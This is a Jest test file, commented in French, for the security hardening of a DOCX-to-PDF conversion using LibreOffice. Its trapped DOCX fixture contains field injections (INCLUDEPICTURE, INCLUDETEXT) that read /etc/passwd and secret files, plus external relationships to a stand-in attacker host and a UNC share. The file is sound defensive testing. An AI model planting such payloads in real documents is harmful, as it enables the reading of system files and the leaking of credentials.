/**
 * Durcissement de la conversion DOCX -> PDF (audit sécurité) : environnement
 * minimal de soffice, DOCX piégé neutralisé, conversions simultanées bornées.
 */
import { promises as fs } from 'fs';
import * as path from 'path';
import PizZip from 'pizzip';

const execFileMock = jest.fn();
jest.mock('child_process', () => ({ execFile: (...args: unknown[]) => execFileMock(...args) }));
const envMock: { DOCX_PDF_CONVERTER?: string } = {};
jest.mock('../../src/config/env', () => ({ env: envMock }));
jest.mock('../../src/utils/logger', () => ({ logger: { error: jest.fn(), warn: jest.fn(), info: jest.fn() } }));

import { activeConversionCount, convertDocxToPdf, MAX_CONCURRENT_CONVERSIONS } from '../../src/lib/pdf-convert';
import { sanitizeDocx } from '../../src/lib/pdf-convert/sanitize-docx';

const PDF = Buffer.from('%PDF-1.7 fake');

const DOCUMENT_XML =
  '<w:document xmlns:w="w"><w:body>' +
  '<w:p><w:r><w:t>Contrat de bail</w:t></w:r></w:p>' +
  '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> INCLUDEPICTURE "file:///etc/passwd" \\d </w:instrText></w:r></w:p>' +
  '<w:p><w:r><w:instrText> INCLUDETEXT "file:///C:/secret.txt" </w:instrText></w:r></w:p>' +
  '<w:p><w:r><w:instrText> PAGE </w:instrText></w:r></w:p>' +
  '<w:fldSimple w:instr=" LINK Excel.Sheet.12 \\"file:///x.xlsx\\" "><w:r><w:t>x</w:t></w:r></w:fldSimple>' +
  '<w:hyperlink r:id="rId9"><w:r><w:t>lien</w:t></w:r></w:hyperlink>' +
  '<w:p><w:r><w:t>file:///etc/shadow</w:t></w:r></w:p>' +
  '</w:body></w:document>';

const RELS =
  '<Relationships>' +
  '<Relationship Id="rId1" Type="styles" Target="styles.xml"/>' +
  '<Relationship Id="rId9" Type="hyperlink" Target="https://attaquant.example/ping" TargetMode="External"/>' +
  '<Relationship Id="rId10" Type="image" Target="file:///etc/passwd" TargetMode="External"/>' +
  '<Relationship Id="rId11" Type="attachedTemplate" Target="\\\\attaquant\\share\\x.dotm" TargetMode="External"></Relationship>' +
  '</Relationships>';

function trappedDocx(): Buffer {
  const zip = new PizZip();
  zip.file('[Content_Types].xml', '<Types/>');
  zip.file('word/document.xml', DOCUMENT_XML);
  zip.file('word/_rels/document.xml.rels', RELS);
  zip.file('word/_rels/settings.xml.rels', RELS);
  zip.file('word/vbaProject.bin', 'MACRO');
  zip.file('word/activeX/activeX1.xml', '<ax/>');
  zip.file('word/styles.xml', '<w:styles/>');
  return zip.generate({ type: 'nodebuffer' });
}

describe('neutralisation du DOCX', () => {
  const clean = new PizZip(sanitizeDocx(trappedDocx()));
  const text = (name: string) => clean.file(name)?.asText() ?? '';

  it('retire toutes les relations externes et garde les internes', () => {
    for (const rels of ['word/_rels/document.xml.rels', 'word/_rels/settings.xml.rels']) {
      expect(text(rels)).not.toMatch(/TargetMode/i);
      expect(text(rels)).not.toContain('attaquant');
      expect(text(rels)).toContain('styles.xml');
    }
  });

  it('neutralise INCLUDEPICTURE, INCLUDETEXT et LINK, mais pas les champs ordinaires', () => {
    const xml = text('word/document.xml');
    expect(xml).not.toMatch(/INCLUDEPICTURE|INCLUDETEXT|LINK/);
    expect(xml).toContain(' PAGE ');
    expect(xml).toContain('Contrat de bail');
  });

  it('ne laisse subsister aucune adresse file:', () => {
    for (const name of Object.keys(clean.files)) {
      if (!clean.files[name].dir) expect(clean.file(name)?.asText()).not.toMatch(/file:/i);
    }
  });

  it('retire macros et ActiveX', () => {
    expect(clean.file('word/vbaProject.bin')).toBeNull();
    expect(clean.file('word/activeX/activeX1.xml')).toBeNull();
  });

  it("refuse ce qui n'est pas une archive DOCX", () => {
    expect(() => sanitizeDocx(Buffer.from('pas une archive'))).toThrow(/Word valide/);
    const zip = new PizZip();
    zip.file('autre.txt', 'x');
    expect(() => sanitizeDocx(zip.generate({ type: 'nodebuffer' }))).toThrow(/Word valide/);
  });
});

describe('conversion', () => {
  beforeEach(() => {
    execFileMock.mockReset();
    envMock.DOCX_PDF_CONVERTER = 'libreoffice';
  });

  it("n'hérite d'aucun secret : soffice reçoit PATH, HOME (dossier de travail) et LANG seulement", async () => {
    process.env.JWT_SECRET = 'secret-a-ne-pas-fuiter-secret-a-ne-pas-fuiter';
    process.env.DATABASE_URL = 'postgresql://u:mot-de-passe@db/prod';
    execFileMock.mockImplementation((_b: string, args: string[], _o: unknown, cb: (e: Error | null) => void) => {
      fs.writeFile(path.join(args[args.indexOf('--outdir') + 1], 'document.pdf'), PDF).then(() => cb(null));
    });
    await convertDocxToPdf(trappedDocx());
    const [, args, options] = execFileMock.mock.calls[0];
    const workDir = args[args.indexOf('--outdir') + 1];
    expect(options.env.HOME).toBe(workDir);
    expect(options.env.LANG).toBe('C.UTF-8');
    expect(
      Object.keys(options.env).filter(k => !['PATH', 'HOME', 'LANG', 'SystemRoot', 'TEMP', 'TMP'].includes(k))
    ).toEqual([]);
    expect(JSON.stringify(options.env)).not.toMatch(/secret-a-ne-pas|mot-de-passe/);
  });

  it('soffice ne reçoit que le DOCX neutralisé', async () => {
    let received = Buffer.alloc(0);
    execFileMock.mockImplementation((_b: string, args: string[], _o: unknown, cb: (e: Error | null) => void) => {
      const input = args[args.length - 1];
      fs.readFile(input)
        .then(buffer => {
          received = buffer;
          return fs.writeFile(path.join(args[args.indexOf('--outdir') + 1], 'document.pdf'), PDF);
        })
        .then(() => cb(null));
    });
    await convertDocxToPdf(trappedDocx());
    const zip = new PizZip(received);
    expect(zip.file('word/document.xml')?.asText()).not.toMatch(/INCLUDEPICTURE|file:/);
    expect(zip.file('word/_rels/document.xml.rels')?.asText()).not.toMatch(/External/);
    expect(zip.file('word/vbaProject.bin')).toBeNull();
  });

  it('borne les conversions simultanées (503 au-delà) et libère les emplacements', async () => {
    const releases: Array<() => void> = [];
    execFileMock.mockImplementation((_b: string, args: string[], _o: unknown, cb: (e: Error | null) => void) => {
      releases.push(() => {
        fs.writeFile(path.join(args[args.indexOf('--outdir') + 1], 'document.pdf'), PDF).then(() => cb(null));
      });
    });
    const running = Array.from({ length: MAX_CONCURRENT_CONVERSIONS }, () => convertDocxToPdf(trappedDocx()));
    await new Promise(resolve => setTimeout(resolve, 50));
    expect(activeConversionCount()).toBe(MAX_CONCURRENT_CONVERSIONS);
    await expect(convertDocxToPdf(trappedDocx())).rejects.toMatchObject({ statusCode: 503 });
    expect(execFileMock).toHaveBeenCalledTimes(MAX_CONCURRENT_CONVERSIONS);

    releases.forEach(release => release());
    await Promise.all(running);
    expect(activeConversionCount()).toBe(0);
    // Un emplacement est de nouveau libre.
    execFileMock.mockImplementation((_b: string, args: string[], _o: unknown, cb: (e: Error | null) => void) => {
      fs.writeFile(path.join(args[args.indexOf('--outdir') + 1], 'document.pdf'), PDF).then(() => cb(null));
    });
    await expect(convertDocxToPdf(trappedDocx())).resolves.toBeInstanceOf(Buffer);
  });

  it("libère l'emplacement après un échec de conversion", async () => {
    execFileMock.mockImplementation((_b: string, _a: string[], _o: unknown, cb: (e: Error) => void) =>
      cb(new Error('boom'))
    );
    await expect(convertDocxToPdf(trappedDocx())).rejects.toMatchObject({ statusCode: 503 });
    expect(activeConversionCount()).toBe(0);
  });
});
